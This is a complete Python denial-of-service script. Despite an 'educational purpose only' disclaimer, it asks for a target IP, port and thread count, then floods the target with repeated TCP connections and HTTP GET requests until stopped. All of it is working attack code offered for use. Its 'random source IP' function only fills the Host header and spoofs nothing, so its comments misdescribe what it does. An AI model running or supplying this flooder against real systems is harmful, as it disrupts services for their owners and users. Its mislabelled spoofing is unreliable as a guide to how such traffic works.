"""
Simple DoS Script - Educational Purpose Only
Sends multiple TCP connection requests to a target IP and port.

WARNING: Unauthorized attacks are illegal. Use only for authorized testing.
"""

import threading
import socket
import random
import time
from ipaddress import ip_address
import sys

# Thread-safe counter and control
packet_count = 0
packet_lock = threading.Lock()
stop_attack = threading.Event()


def validate_ip(ip):
    """Validate IP address format."""
    try:
        ip_address(ip)
        return True
    except ValueError:
        return False


def generate_source_ip():
    """Generate a random source IP address."""
    return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"


def attack(target_ip, target_port, thread_id):
    """
    Send HTTP GET requests to target.
    
    Args:
        target_ip: Target IP address
        target_port: Target port number
        thread_id: Thread identifier for logging
    """
    while not stop_attack.is_set():
        try:
            source_ip = generate_source_ip()
            
            # Create socket with timeout
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)  # 3-second timeout
            
            # Connect to target
            s.connect((target_ip, target_port))
            
            # Send HTTP GET request (use send() for TCP, not sendto())
            request = f"GET / HTTP/1.1\r\nHost: {source_ip}\r\n\r\n"
            s.send(request.encode('ascii'))
            
            s.close()
            
            # Update packet count (thread-safe)
            with packet_lock:
                global packet_count
                packet_count += 1
                print(f"[Thread {thread_id}] Packet sent: {packet_count}")
            
            # Rate limiting - small delay to avoid resource exhaustion
            time.sleep(0.01)
            
        except socket.timeout:
            print(f"[Thread {thread_id}] Connection timeout")
        except ConnectionRefusedError:
            print(f"[Thread {thread_id}] Connection refused")
        except OSError as e:
            print(f"[Thread {thread_id}] Network error: {e}")
        except Exception as e:
            print(f"[Thread {thread_id}] Unexpected error: {e}")


def main():
    """Main function to initialize and run the attack."""
    try:
        # Get user inputs
        target_ip = input("Enter Target IP (e.g. 192.168.0.1): ").strip()
        
        # Validate IP
        if not validate_ip(target_ip):
            print("Invalid IP address format!")
            return
        
        target_port = int(input("Enter Target Port (e.g. 8080): "))
        
        if target_port < 1 or target_port > 65535:
            print("Port must be between 1 and 65535!")
            return
        
        num_threads = int(input("Enter number of threads (default 5): ") or "5")
        
        print(f"\nStarting attack on {target_ip}:{target_port} with {num_threads} threads")
        print("Press Ctrl+C to stop...\n")
        
        # Create and start threads
        threads = []
        for i in range(num_threads):
            thread = threading.Thread(target=attack, args=(target_ip, target_port, i), daemon=False)
            threads.append(thread)
            thread.start()
        
        # Keep main thread alive
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n\nStopping attack...")
            stop_attack.set()
        
        # Wait for threads to finish
        for thread in threads:
            thread.join(timeout=2)
        
        print(f"Total packets sent: {packet_count}")
        
    except ValueError:
        print("Invalid input! Port must be a number.")
    except Exception as e:
        print(f"Error: {e}")


if __name__ == "__main__":
    main()


